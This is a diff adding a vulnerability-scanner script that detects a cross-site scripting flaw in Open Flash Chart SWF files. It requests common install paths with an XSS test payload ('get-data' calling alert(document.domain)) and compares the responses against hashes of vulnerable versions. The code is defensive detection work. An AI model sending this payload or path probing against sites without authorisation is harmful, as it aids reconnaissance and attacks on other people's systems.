@@ -1,0 +1,98 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("3da40b91c8c063887f71d3cf54a33937");
+hashes.push("26ed7a4d583c54f0e403384f68958601");
+hashes.push("622cb9cb1c79c5c49511c3d41cc38783");
+hashes.push("e77a073be7fadc7402e4bb93cfa406d9");
+hashes.push("7a74d3d615135b674c63a0af6ce9420e");
+hashes.push("06daa1d4a2812beb8c4a8f8ceb4d89c2");
+hashes.push("e64809b4a9d5263d598a27aaeb90d055");
+hashes.push("7bf678c04d5df4b1c39a70d1c5cf02ea");
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testSWFOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;
+    var exploit = "?get-data=(function(){alert(document.domain)})()";
+    // we could have a directory like /zeroclipboard or a full path like /zeroclipboard/ZeroClipboard.swf
+	if (dir.endsWith(".swf"))
+        lastJob.uri  = dir + exploit;
+    else
+        lastJob.uri  = dir + "/open-flash-chart.swf" + exploit;
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(lastJob.uri.replace(exploit, ""), 'Open_Flash_Chart_SWF_XSS.xml', lastJob);
+            }
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name.match(/open\-flash\-chart.*?.swf/))
+			{
+				if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}
+		}
+	}	
+    
+    var tested_common_dirs = getGlobalValue("openflashchart_swf_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("openflashchart_swf_tested_common_dirs", 1, true);
+        dirs.push("/open-flash-chart");
+        dirs.push("/OpenFlashChart");
+        dirs.push("/files/open-flash-chart");
+        dirs.push("/swf/open-flash-chart");
+        dirs.push("/flash/open-flash-chart");
+        dirs.push("/sites/all/modules/civicrm/packages/OpenFlashChart");
+        dirs.push("/joomla/components/com_jnews/includes/openflashchart");
+        dirs.push("/wp-content/plugins/civicrm/civicrm/packages/OpenFlashChart");
+        dirs.push("/wp-content/plugins/wp-click-track/open-flash-chart");
+        dirs.push("/piwik/libs/open-flash-chart");
+        dirs.push("/piwik/libs/open-flash-chart/php-ofc-library");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0) 
+{
+	for (var i=0; i<dirs.length; i++)
+		testSWFOnDir(dirs[i]);
+}
